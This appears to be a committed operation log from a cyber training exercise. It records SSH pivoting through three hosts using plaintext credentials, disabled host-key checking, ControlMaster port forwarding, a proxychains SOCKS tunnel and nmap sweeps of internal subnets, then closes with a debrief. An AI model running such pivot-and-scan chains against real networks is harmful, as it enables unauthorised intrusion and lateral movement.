@@ -1,0 +1,89 @@
+ANGRYAARDVARK01
+Date: 15AUG22
+Start Time: 0900
+IP:
+>T1:  10.50.29.166
+->T2: 10.20.169.121
+-->T3: Unknown 
+
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166 // 10.20.169.33
+OS: Linux v. unknown @@
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+<notify MC>
+<ip to EA>
+<start vetting>
+Action: Perform SSH masquerade and redirect to the next target.
+<time and notify MC of disconnect>
+
+
+T2:
+Hostname: WEBSERVER
+IP: 10.20.169.121
+OS: Linux v. unknown @@
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.121:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+<notify MC>
+<ip to EA>
+<start vetting>
+Action: Perform SSH masquerade. Identify the next target (the suspected routing device is believed to be in the 10.20.169.128/25 subnet with an open ssh port in the range of 52000 - 52999). Redirect to the next target.
+
+ssh -S /tmp/T2 bad -O forward -D 9050
+proxychains nmap -Pn -sT 10.20.169.129 -p52000-52999 -T4 | grep open
+proxychains nmap -Pn -sT 10.20.169.128/25 -p52203 -T4 | grep open
+proxychains nmap -Pn -sT 10.20.169.121 -p52203 -T4 | grep open
+seq 129 254 | xargs -P 50 -I{} proxychains nmap -p52200-52500 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 10.20.169.{} | grep open
+
+####CHECK in NSDB!!!!#####
+#####INFORM MC and EA of NEW IP#####
+
+
+####ASK MC or EA if you need to ACCESS#####
+T3: 10.20.169.238
+Hostname: Unknown
+IP: 10.20.169.238
+@@OS: Suspected routing device
+@@Creds: Unknown - NOC_Admin#::5gftE8DCc8
+@@Last Known SSH Port: Unknown - 52230
+
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.238:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+5gftE8DCc8
+Action: Test credentials supplied by analyst via SSH masquerade. Conduct network discovery and record all results. Network discovery will at a minimum consist of scanning to determine all potential target IP’s, OS’s, and SSH Ports.  SSH ports for the potential target devices in this network are usually in the 33000 range. Conclude operation.
+ssh -S /tmp/T2 bad -O cancel -D 9050
+ssh -S /tmp/T3 bad -O forward -D 9050
+proxychains nmap -Pn -sT 192.168.169.0/24 -p33000-33999 -T4 | grep open
+seq 1 254 | xargs -P 50 -I{} proxychains nmap -p33000-33999 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 192.168.169.{} | grep open
+
+man ping
+for i in {1..255}; do sudo ping -c 1 -W 1 192.168.169.$i; done | grep 'bytes from'
+proxychains nmap -Pn -sT 192.168.169.1,2,3,5,12,13,16,43,111,113,206 -p33000-33999 -T4 --oG proxychains_nmap | grep open
+
+192.168.169.5 33521 SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
+192.168.169.12 33521 SSH-2.0-OpenSSH_for_Windows_7.9
+192.168.169.16 33521 SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
+192.168.169.43 33521 SSH-2.0-OpenSSH_7.4
+
+DEBRIEF
+
+Operator: 1LT An
+
+Operation: ANGRYAARDVARK01
+
+MC: mc1
+
+Analyst: analyst1
+
+Description: ANGRYAARDVARK01 is a C-ISR mission. On T1, we redirected to T2 via ssh masquerade. On T2, we scan the internal network 10.20.169.128/25 and found the next target T3. Using the cred provided by the EA, we ssh-masquerade to T3. On T3, we once again scanned the new network 192.168.169.0/24 and found four devices with the ssh ports in the 33000 range. This information will be used on FUOPs. 
+
+
